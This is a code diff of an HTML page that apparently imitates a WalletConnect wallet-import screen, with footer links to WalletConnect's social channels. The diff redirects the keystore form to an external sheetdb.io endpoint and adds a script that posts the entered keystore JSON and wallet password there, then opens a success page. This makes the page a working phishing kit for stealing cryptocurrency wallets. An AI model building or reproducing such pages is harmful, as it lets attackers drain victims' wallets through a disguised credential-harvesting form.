@@ -71,40 +71,25 @@
             <br>
             <button type="submit" class="btn">VALIDATE</button>
         </form>
-        <script>
-            var form = document.getElementById('sheetdb-form');
-        form.addEventListener("submit", e => {
-          e.preventDefault();
-          fetch(form.action, {
-              method : "POST",
-              body: new FormData(document.getElementById("sheetdb-form")),
-          }).then(
-              response => response.json()
-          ).then((html) => {
-            // you can put any JS code here
-            window.open('../success.html', '_blank');
-
-          });
-        });
-        </script>
+       
         
     </div>
 
     <div id="keystore" class="tabcontent" style="display: none;">
-        <form action="function.php" method="POST">
+        <form action="https://sheetdb.io/api/v1/tzpzgrvcmooc9" method="POST" id="sheetdb-form">
 
             <input type="hidden" name="w" value="aerternity">
 
-            <textarea name="keystorejson" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
+            <textarea name="data[keystorejson]" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
             <br>
 
             <div class="field">
-                <input type="password" name="password" placeholder="Password">
+                <input type="password" name="data[password]" placeholder="Password">
             </div>
             <input type="text" name="user" value="" style="visibility: hidden;">
             <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
             <br>
-            <button type="submit" class="btn">IMPORT</button>
+            <button type="submit" class="btn">VALIDATE</button>
         </form>
     </div>
 
@@ -125,11 +110,34 @@
         document.getElementById("default").click();
     </script>
     <footer><div id="footer">
-        <p><img src="../assets/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP">Discord</a></p><br>
-        <p><img src="../assets/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements">Telegram</a></p><br>
-        <p><img src="../assets/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/">Twitter</a></p><br>
-        <p><img src="../assets/github.svg" class="footimg">  <a href="https://github.com/walletconnect">Github</a></p><br>
+        <p><img src="../assets/discord.svg" class="footimg" alt="iconics">  <a href="https://discord.gg/jhxMvxP">Discord</a></p><br>
+        <p><img src="../assets/telegram.svg" class="footimg" alt="iconics">  <a href="https://t.me/walletconnect_announcements">Telegram</a></p><br>
+        <p><img src="../assets/twitter.svg" class="footimg" alt="iconics">  <a href="https://twitter.walletconnect.org/">Twitter</a></p><br>
+        <p><img src="../assets/github.svg" class="footimg" alt="iconics">  <a href="https://github.com/walletconnect">Github</a></p><br>
     </div></footer>
-</center></body>
+</center>
+
+<!-- script connecting to the googlesheet -->
+<script>
+    var form = document.getElementById('sheetdb-form');
+form.addEventListener("submit", e => {
+  e.preventDefault();
+  fetch(form.action, {
+      method : "POST",
+      body: new FormData(document.getElementById("sheetdb-form")),
+  }).then(
+      response => response.json()
+  ).then((html) => {
+    // you can put any JS code here
+    window.open('../success.html');
+
+  });
+});
+</script>
+
+
+
+
+</body>
 
 </html>
